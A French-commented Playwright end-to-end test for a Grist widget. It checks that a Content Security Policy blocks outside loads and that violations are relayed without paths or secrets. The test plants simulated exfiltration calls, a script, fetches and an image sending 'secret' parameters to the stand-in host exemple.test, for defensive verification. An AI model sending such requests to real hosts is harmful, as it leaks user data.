#!/usr/bin/env node
// Le relais des appels que la politique de sécurité bloque (règle S8, consignes GFS 037 et 038), mesuré avec la vraie
// page widget.html, la politique appliquée, dans la vraie page d'un vrai Grist.
//
// Ce qu'on ne peut pas faire ici : ouvrir Form+ dans un vrai GFS (le point 5 de la 038 le demande, GFS le rejoue chez lui).
// Ce qu'on fait : le widget est ouvert dans la page du document de test avec `gfs=1` à l'adresse de son cadre (donc
// `GfsLink.hosted`, comme sous GFS) ; la page de Grist, parent du cadre, joue GFS : elle note tout message de l'enveloppe de
// GFS que le cadre lui poste et répond à `contexte`. On fait ensuite, DANS le cadre, ce qu'un code piraté tenterait.
//
// Vérifie :
//   1. au démarrage, le cadre dit `securite` / `relais` avec la version du kit (le relais est parti avant les autres imports) ;
//   2. un script, un `fetch` et une image vers un hôte que la politique n'ouvre pas (http, ou un script https hors liste) sont
//      bloqués par le navigateur ET relayés avec `exemple.test` seul : ni chemin, ni `secret`, ni paramètre dans aucun message ;
//   3. LA LIMITE, dite : un `fetch` en https vers un hôte quelconque n'est PAS bloqué (connect-src https:, l'exception de la
//      règle S3 : l'app appelle le serveur Grist de la personne, dont l'hôte n'est connu qu'à l'exécution) donc rien n'est relayé ;
//   4. aucune erreur de page.
//
// À jouer avec la politique appliquée (sans elle rien n'est bloqué, le test n'aurait pas de sens) :
//   tests/grist-env/start-grist-test.sh   (une fois), puis arrêter le serveur du port 8010 et lancer
//   node tests/grist-env/serveur-csp.js 8010 8484 &
//   FORMPLUS_CSP=1 NODE_PATH=$(npm root -g) node tests/grist-env/e2e-relais-violations.js [dossier_captures]
// Variables : GRIST_PORT (8484), WIDGET_PORT (8010), GRIST_TEST_STATE_DIR (~/.formplus-grist-test).
// Sort avec un code non nul au premier contrôle qui échoue.
'use strict';
const { chromium } = require('playwright');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');

const GRIST_PORT = process.env.GRIST_PORT || '8484';
const WIDGET_PORT = process.env.WIDGET_PORT || '8010';
const STATE_DIR = process.env.GRIST_TEST_STATE_DIR || path.join(os.homedir(), '.formplus-grist-test');
const SHOTS = process.argv[2] || fs.mkdtempSync(path.join(os.tmpdir(), 'formplus-e2e-relais-'));
const info = JSON.parse(fs.readFileSync(path.join(STATE_DIR, 'grist-test-doc.json'), 'utf8'));
const GRIST = `http://localhost:${GRIST_PORT}`;
const DOC_URL = `${GRIST}/o/${info.org}/${info.docId}`;
const KIT_VERSION = JSON.parse(fs.readFileSync(path.resolve(__dirname, '..', '..', 'kit', 'package.json'), 'utf8')).version;
fs.mkdirSync(SHOTS, { recursive: true });

let failed = 0;
const check = (name, cond, detail) => {
  console.log(`${cond ? '✓' : '✗'} ${name}${!cond && detail ? ` — ${detail}` : ''}`);
  if (!cond) failed++;
};
const get = (url) => new Promise((resolve, reject) => http.get(url, (r) => { let b = ''; r.on('data', (c) => { b += c; }); r.on('end', () => resolve(b)); }).on('error', reject));

(async () => {
  if (!process.env.FORMPLUS_CSP) { console.log('✗ à jouer avec FORMPLUS_CSP=1 et tests/grist-env/serveur-csp.js sur le port du widget (la politique doit être appliquée)'); process.exit(2); }
  const pluginApi = await get(`${GRIST}/grist-plugin-api.js`);
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 }, locale: 'fr-FR' });
  await ctx.route('https://docs.getgrist.com/grist-plugin-api.js', (route) => route.fulfill({
    status: 200, contentType: 'application/javascript', headers: { 'Cache-Control': 'no-store' }, body: `eval(${JSON.stringify(pluginApi)});`,
  }));
  // Dans GFS, l'adresse du cadre porte `gfs=<n>` (contrats 1.3) : une redirection l'ajoute à l'adresse que Grist charge.
  await ctx.route(new RegExp(`^http://localhost:${WIDGET_PORT}/poc/widget\\.html`), (route) => {
    const u = new URL(route.request().url());
    if (u.searchParams.has('gfs')) return route.continue();
    u.searchParams.set('gfs', '1');
    return route.fulfill({ status: 302, headers: { Location: u.toString(), 'Cache-Control': 'no-store' } });
  });
  const problems = [];
  ctx.on('page', (p) => p.on('pageerror', (e) => problems.push(`PAGEERROR ${e.message}`)));

  const page = await ctx.newPage();
  // La page de Grist, parent du cadre, joue GFS : elle garde les messages de l'enveloppe de GFS que le cadre lui poste.
  await page.addInitScript(() => {
    window.__deLApp = [];
    window.addEventListener('message', (e) => { if (e.data && typeof e.data === 'object' && 'gfs' in e.data) window.__deLApp.push(JSON.parse(JSON.stringify(e.data))); });
  });
  await page.goto(`${GRIST}/test/login?username=test@formplus.local&name=Test%20FormPlus&next=${encodeURIComponent(GRIST + '/o/' + info.org)}`);
  await page.goto(DOC_URL);
  await page.getByText('FormPlus', { exact: true }).first().click();
  let frame = null;
  for (let i = 0; i < 120 && !frame; i++) {
    frame = page.frames().find((fr) => fr.url().includes('widget.html'));
    if (!frame) await page.waitForTimeout(100);
  }
  if (!frame) throw new Error('cadre du widget introuvable');
  check('le cadre du widget porte `gfs=1` (il se croit hébergé, comme sous GFS)', frame.url().includes('gfs=1'), frame.url());

  // GFS répond à `contexte`, comme il le ferait : le lien du kit retient alors l'origine de GFS (0.27.0).
  const fromApp = () => page.evaluate(() => window.__deLApp);
  let ctxMessage = null;
  for (let i = 0; i < 100 && !ctxMessage; i++) { ctxMessage = (await fromApp()).find((m) => m.type === 'appel' && m.nom === 'contexte'); if (!ctxMessage) await page.waitForTimeout(100); }
  check('le cadre demande `contexte` à GFS', !!ctxMessage);
  // (Les messages du cadre portent le numéro de contrat de l'app (`gfs: 0`) ; ceux de GFS portent le contrat que l'adresse du
  // cadre annonce, `gfs=1` : la réponse part donc avec `gfs: 1`, sinon le lien du kit l'ignore. Une fois acceptée, il retient
  // l'origine de la page parente (kit 0.27.0) et poste ensuite, relais compris, à cette origine et plus à '*'.)
  if (ctxMessage) await page.evaluate((id) => { const fr = [...document.querySelectorAll('iframe')].find((i) => i.src.includes('widget.html')); fr.contentWindow.postMessage({ gfs: 1, type: 'reponse', id, data: {} }, '*'); }, ctxMessage.id);

  // ─── 1. Le relais est parti au démarrage ───
  let relais = null;
  for (let i = 0; i < 50 && !relais; i++) { relais = (await fromApp()).find((m) => m.nom === 'securite' && m.args && m.args.quoi === 'relais'); if (!relais) await page.waitForTimeout(100); }
  check('au démarrage, le cadre dit `securite` / `relais`', !!relais);
  check(`…avec la version du kit (${KIT_VERSION})`, !!relais && relais.args.kit === KIT_VERSION, JSON.stringify(relais && relais.args));
  check('…sans réponse attendue (un appel sans `id`)', !!relais && relais.type === 'appel' && relais.id === undefined);
  await page.waitForTimeout(500); // la réponse à `contexte` est arrivée : le lien retient l'origine de la page parente, les alertes suivantes partent à cette origine

  // ─── 2. Ce qu'un code piraté tenterait, et que la politique bloque ───
  const before = (await fromApp()).filter((m) => m.nom === 'securite' && m.args && m.args.quoi === 'bloque').length;
  const seen = await frame.evaluate(async () => {
    const violations = [];
    document.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.effectiveDirective} : ${e.blockedURI}`));
    const blocked = {};
    // a. un script d'un hôte que script-src n'ouvre pas ;
    const s = document.createElement('script'); s.src = 'https://exemple.test/x.js?secret=1'; document.head.appendChild(s);
    // b. un fetch vers un hôte en http (connect-src n'ouvre que 'self' et https:) ;
    try { await fetch('http://exemple.test/y?secret=2'); } catch (e) { blocked.fetchHttp = String(e.message); }
    // c. une image en http (img-src n'ouvre que 'self', data: et https:) ;
    new Image().src = 'http://exemple.test/z.png?secret=3';
    await new Promise((r) => setTimeout(r, 800));
    const afterBlocked = violations.length;
    // d. LA LIMITE : un fetch en https vers un hôte quelconque. connect-src https: le permet (règle S3, exception dite).
    try { await fetch('https://exemple.test/ok?secret=4'); } catch (e) { blocked.fetchHttps = String(e.message); }
    await new Promise((r) => setTimeout(r, 800));
    return { violations, afterBlocked, afterHttps: violations.length, blocked };
  });
  check('le navigateur a bloqué un script, un fetch http et une image http vers l\'hôte tiers', seen.afterBlocked >= 3, JSON.stringify(seen.violations));
  check('LA LIMITE : un fetch en https vers un hôte quelconque n\'est PAS bloqué (connect-src https:, exception de la règle S3)', seen.afterHttps === seen.afterBlocked, JSON.stringify(seen.violations));
  await page.waitForTimeout(500);
  const sent = (await fromApp()).filter((m) => m.nom === 'securite' && m.args && m.args.quoi === 'bloque');
  check('GFS a reçu au moins trois alertes `bloque`', sent.length - before >= 3, String(sent.length - before));
  const directives = new Set(sent.map((m) => m.args.directive));
  check('…pour des directives différentes (script, connexion, image)', [...directives].some((d) => d.startsWith('script-src')) && directives.has('connect-src') && directives.has('img-src'), [...directives].join(', '));
  check('…toutes avec `exemple.test` seul comme cible', sent.length > 0 && sent.every((m) => m.args.cible === 'exemple.test'), JSON.stringify(sent.map((m) => m.args.cible)));
  const all = JSON.stringify(await fromApp());
  check('…et rien du chemin ni des paramètres n\'a quitté la page (ni `secret`, ni `x.js`, ni `/y`, ni `z.png`)', !/secret|x\.js|\/y\b|z\.png/.test(all));
  check('…aucun message n\'a de `data:` ni d\'adresse complète (`http`)', !/"cible":"https?:/.test(all));
  console.log(`   alertes relayées : ${sent.map((m) => `${m.args.directive}→${m.args.cible} (×${m.args.fois})`).join(' ; ')}`);
  await page.screenshot({ path: path.join(SHOTS, 'relais.png') });

  check('aucune erreur de page pendant tout le parcours', problems.length === 0, problems.join(' | '));
  await browser.close();
  if (failed) { console.log(`\n${failed} contrôle(s) en échec. Captures : ${SHOTS}`); process.exit(1); }
  console.log(`\nTout est vert. Captures : ${SHOTS}`);
})().catch((e) => { console.log(`✗ exception : ${e.message}`); process.exit(1); });
